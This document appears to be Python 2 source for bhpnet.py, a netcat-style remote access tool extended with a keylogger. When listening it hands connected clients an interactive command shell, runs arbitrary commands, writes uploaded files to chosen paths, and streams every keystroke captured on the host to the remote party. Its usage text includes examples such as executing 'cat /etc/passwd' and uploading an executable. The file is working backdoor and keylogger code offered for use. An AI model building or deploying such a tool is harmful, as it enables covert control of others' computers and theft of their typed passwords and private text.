#!/usr/local/bin/python2
import sys
import socket
import getopt
import threading
import subprocess
import keyboard  # required for keylogger functionality

# define some global variables
listen = False
command = False
upload = False
execute = ""
target = ""
upload_destination = ""
port = 0
keylogger = False  # new flag for keylogger mode

# this runs a command and returns the output
def run_command(command):
    # trim the newline
    command = command.rstrip()
    # run the command and get the output back
    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
    except:
        output = "Failed to execute command.\r\n"
    # send the output back to the client
    return output

# this handles incoming client connections
def client_handler(client_socket):
    global upload
    global execute
    global command
    global keylogger

    # if keylogger mode is enabled, start capturing and sending keystrokes
    if keylogger:
        def send_key(event):
            try:
                # send the name of the key (plus a newline) to the client
                client_socket.send(event.name + "\n")
            except Exception as e:
                pass  # if sending fails, ignore the error
        keyboard.on_press(send_key)
        # Block indefinitely while the keylogger is active
        keyboard.wait()
        return

    # check for file upload
    if len(upload_destination):
        file_buffer = ""
        while True:
            data = client_socket.recv(1024)
            if not data:
                break
            else:
                file_buffer += data
        try:
            file_descriptor = open(upload_destination, "wb")
            file_descriptor.write(file_buffer)
            file_descriptor.close()
            client_socket.send("Successfully saved file to %s\r\n" % upload_destination)
        except:
            client_socket.send("Failed to save file to %s\r\n" % upload_destination)
    
    # check for command execution
    if len(execute):
        output = run_command(execute)
        client_socket.send(output)
    
    # if a command shell was requested, enter into a loop to handle commands
    if command:
        while True:
            client_socket.send("<BHP:#> ")
            cmd_buffer = ""
            while "\n" not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024)
            response = run_command(cmd_buffer)
            client_socket.send(response)

# this is for incoming connections (server mode)
def server_loop():
    global target
    global port
    if not len(target):
        target = "0.0.0.0"
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target, port))
    server.listen(5)
    while True:
        client_socket, addr = server.accept()
        # spin off a thread to handle our new client
        client_thread = threading.Thread(target=client_handler, args=(client_socket,))
        client_thread.start()

# client mode – send data to the server (or just receive in keylogger mode)
def client_sender(buffer):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client.connect((target, port))
        # in non-keylogger mode, send any initial data from stdin
        if len(buffer) and not keylogger:
            client.send(buffer)
        while True:
            response = ""
            data = client.recv(4096)
            if not data:
                break
            response += data
            print response,
            # in keylogger mode, we only receive keystrokes so do not prompt for input
            if not keylogger:
                buffer = raw_input("")
                buffer += "\n"
                client.send(buffer)
    except:
        print "[*] Exception! Exiting."
        client.close()

def usage():
    print "Netcat Replacement"
    print
    print "Usage: bhpnet.py -t target_host -p port"
    print "-l --listen              - listen on [host]:[port] for incoming connections"
    print "-e --execute=file_to_run - execute the given file upon receiving a connection"
    print "-c --command             - initialize a command shell"
    print "-u --upload=destination  - upon receiving connection upload a file and write to [destination]"
    print "-k --key                 - enable remote keylogger functionality"
    print
    print "Examples: "
    print "bhpnet.py -t 192.168.0.1 -p 5555 -l -c"
    print "bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe"
    print "bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\""
    print "echo 'ABCDEFGHI' | ./bhpnet.py -t 192.168.11.12 -p 135"
    sys.exit(0)

def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target
    global keylogger

    if not len(sys.argv[1:]):
        usage()
    # read the commandline options
    try:
        opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cku:", ["help", "listen", "execute", "target", "port", "command", "upload", "key"])
    except getopt.GetoptError as err:
        print str(err)
        usage()
    for o, a in opts:
        if o in ("-h", "--help"):
            usage()
        elif o in ("-l", "--listen"):
            listen = True
        elif o in ("-e", "--execute"):
            execute = a
        elif o in ("-c", "--command"):
            command = True
        elif o in ("-u", "--upload"):
            upload_destination = a
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p", "--port"):
            port = int(a)
        elif o in ("-k", "--key"):
            keylogger = True
        else:
            assert False, "Unhandled Option"
    
    # if not listening, we're in client mode – send data from stdin
    if not listen and len(target) and port > 0:
        buffer = sys.stdin.read()
        print "client mode\n"
        client_sender(buffer)
    
    # if we are listening, run in server mode (keylogger or other functionalities)
    if listen:
        print "listen mode\n"
        server_loop()

main()
